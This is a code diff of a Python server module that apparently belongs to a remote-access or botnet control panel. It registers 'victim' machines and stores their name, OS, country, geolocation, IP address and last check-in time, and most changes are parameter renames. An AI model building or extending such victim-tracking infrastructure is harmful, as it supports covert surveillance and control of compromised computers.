@@ -8,19 +8,17 @@ from server import pydantic_models
 from server.CRUD.security import hash_victim_id
 
 
-def register_victim(db: Session, victim: pydantic_models.RegisterVictim):
+def register_victim(db: Session, pdm_victim: pydantic_models.RegisterVictim):
     """the function adds a new victim-user to the database"""
-    new_victim = Victim_DB(pc_name=victim.pc_name,
-                           id_admin=victim.id_admin,
-                           last_login_date=datetime.datetime.now().strftime("%Y:%m:%d:%H:%M:%s"),
-                           last_login_time=time.time(),
-                           os_name=victim.os_name
+    new_victim = Victim_DB(pc_name=pdm_victim.pc_name,
+                           id_admin=pdm_victim.id_admin,
+                           os_name=pdm_victim.os_name
                            )
     db.add(new_victim)
     db.commit()
     __update_victim_hash_id(db=db, _id=new_victim.id_victim)
     db.refresh(new_victim)
-    return new_victim.victim_hash_id
+    return new_victim
 
 
 def __update_victim_hash_id(db: Session, _id: int):
@@ -31,29 +29,30 @@ def __update_victim_hash_id(db: Session, _id: int):
     return hashed_id
 
 
-def update_data_victim(db: Session, victim: pydantic_models.UpdateDataVictim):
+def update_data_victim(db: Session, pdm_victim: pydantic_models.UpdateDataVictim):
     """the function updates data about the victim-user
     such as:
     -country
     -geolocation
     -ip address of the victim-user"""
-    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == victim.victim_hash_id).update(dict(victim),
-                                                                                             synchronize_session=False)
+
+    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id).update(dict(pdm_victim),
+                                                                                                           synchronize_session=False)
     db.commit()
     return data_victim
 
 
-def set_login_date(db: Session, victim: pydantic_models.LoginVictim):
+def set_login_date(db: Session, pdm_victim):
     """the function updates data about the time of the last request of the victim-user"""
-    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == victim.victim_hash_id).update(
+    data_victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id).update(
         {"last_login_date": datetime.datetime.now().strftime("%Y:%m:%d:%H:%M:%s"),
          "last_login_time": str(time.time())}, synchronize_session=False)
     db.commit()
     return data_victim
 
 
-def get_victm_hash_id(db: Session, victim: pydantic_models.LongpoolVictim):
-    victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == victim.victim_hash_id)
+def get_victim_hash_id(db: Session, pdm_victim: pydantic_models.LongpoolVictim):
+    victim = db.query(Victim_DB).filter(Victim_DB.victim_hash_id == pdm_victim.victim_hash_id)
     return victim.scalar()
 
 
